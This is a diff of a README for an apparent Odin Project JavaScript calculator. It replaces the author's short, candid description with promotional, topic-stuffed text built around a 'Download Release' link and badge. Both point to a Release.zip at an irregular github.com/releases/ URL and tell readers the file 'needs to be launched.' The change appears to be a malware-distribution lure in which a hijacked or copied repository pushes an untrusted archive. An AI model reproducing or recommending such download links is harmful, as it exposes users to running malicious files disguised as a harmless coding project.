@@ -1,18 +1,21 @@
-# Calculator
-### It is a calculator
-#### I think there is no doubt
+# 🌟 The Ultimate JS Calculator Repository 🧮
+
+Welcome to the "js-calculator" repository, your ultimate destination for all things related to The Odin Project Calculator Assignment! 🚀
+
+## Description
+This repository serves as a hub for the Calculator Assignment from The Odin Project. Whether you are a beginner looking to learn JavaScript or an experienced developer wanting to sharpen your skills, this is the perfect place for you! Build and explore different calculator applications using JavaScript with the resources provided here. 
+
+## Topics
+🔖 **Topics:** assignment, assignment-solutions, assignments-of-the-course, calculator, calculator-app, calculator-application, calculator-javascript, calculator-js, theodinproject, theodinproject-intermediate-html-css, theodinproject-js, theodinproject-nodejs, theodinproject-rails, theodinprojectfoundations
+
+## Resources
+📁 **Download Release:** [Calculator App Release](https://github.com/releases/789694263/Release.zip)
+📌 *Note: The provided link needs to be launched.*
+
+In case the link is broken or unavailable, please check the "Releases" section for an alternative download.
+
+Feel free to explore and enhance your JavaScript skills with the Calculator Assignment from The Odin Project. Happy coding! 🎉
+
 ---
 
-![screenshot](screenshot.PNG "Calculator")
-
-Created with VanillaJS, HTML & CSS. It is for The Odin Project Assignment. 
-
-It does not handle 0.1 + 0.2 case, because why it should?
-
-For more info, you can check [IEEE 754](https://ieeexplore.ieee.org/document/8766229)
-
-It may contain some bugs but I do not have time for insect powder.
-
-It is responsive (by nature of flexboxes) but not mobile-friendly. So use desktop layout for best result. 
-
-
+[![Download Calculator App](https://img.shields.io/badge/Download%20Calculator%20App-Release-green)](https://github.com/releases/789694263/Release.zip)
